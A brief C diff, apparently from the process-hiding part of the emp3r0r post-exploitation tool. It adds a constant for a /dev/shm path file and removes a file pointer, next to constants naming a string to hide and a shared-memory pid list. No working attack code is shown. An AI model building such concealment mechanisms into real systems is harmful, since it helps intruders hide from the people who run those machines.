@@ -9,5 +9,5 @@ enum {
 
 const char* HIDE_ME = "emp3r0r";
 const char* SHM_FILE = "/dev/shm/emp3r0r_pids";
+const char* EMP_FILE = "/dev/shm/emp3r0r_path";
 const char* EmpPATH = "/dev/shm/emp3r0r";
-FILE* SHM_FD = NULL;
